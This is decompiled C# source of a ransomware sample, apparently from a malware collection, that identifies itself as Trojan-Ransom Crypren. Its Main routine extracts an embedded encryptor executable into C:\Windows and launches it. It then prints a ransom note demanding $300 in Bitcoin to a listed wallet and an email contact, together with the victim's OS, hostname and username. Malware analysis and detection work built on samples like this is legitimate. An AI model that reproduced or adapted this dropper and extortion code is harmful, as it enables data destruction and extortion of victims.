// Decompiled with JetBrains decompiler
// Type: RubberDucky.Program
// Assembly: RubberDucky, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 03B6C224-13E5-4A76-8467-213438522558
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.MSIL.Crypren.gen-bdcbc119335bda8a8d875c7e8029e1a587126caa08ad6c66f0e18f29a4ab1f00.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Threading;

namespace RubberDucky
{
  internal class Program
  {
    private static void Main()
    {
      Program.Extract("RubberDucky", "C:\\Windows", "Resources", "RubberDucky_Crypt0r.exe");
      Process.Start("C:\\\\Windows\\\\RubberDucky_Crypt0r.exe");
      string[] strArray = new string[24]
      {
        "Your data is encrypted with a special encryption software, it is certainly impossible for you to recover your data",
        Environment.NewLine,
        "without a private key, to purchase it, follow the steps, below, without skipping any.",
        Environment.NewLine,
        Environment.NewLine,
        "1. Send $300 worth of Bitcoins to: 1HNkDUPxEhnN8Q2ZicSnmrifDJYUpAFdbG",
        Environment.NewLine,
        Environment.NewLine,
        "2. E-mail danielnusradin@gmail.com your BTC transaction ID, as well as your personal installation Key.",
        Environment.NewLine,
        Environment.NewLine,
        "3. Your personal installation Key: HDSUEHDHWIDHjhsjUUU277278282UUKXSKD",
        Environment.NewLine,
        "NOTE: DO NOT CLOSE THE CONSOLE APP!",
        Environment.NewLine,
        Environment.NewLine,
        "Your operating system: ",
        Environment.OSVersion.ToString(),
        Environment.NewLine,
        "Hostname: ",
        Dns.GetHostName(),
        Environment.NewLine,
        "PC UserName: ",
        Environment.UserName
      };
      foreach (char ch in string.Concat(strArray))
      {
        Console.Write(ch);
        Thread.Sleep(30);
      }
      Console.WriteLine();
      Console.ReadLine();
    }

    private static void Extract(
      string nameSpace,
      string outDirectory,
      string internalFilePath,
      string resourceName)
    {
      using (Stream manifestResourceStream = Assembly.GetCallingAssembly().GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
      {
        using (BinaryReader binaryReader = new BinaryReader(manifestResourceStream))
        {
          using (FileStream output = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
          {
            using (BinaryWriter binaryWriter = new BinaryWriter((Stream) output))
              binaryWriter.Write(binaryReader.ReadBytes((int) manifestResourceStream.Length));
          }
        }
      }
    }
  }
}
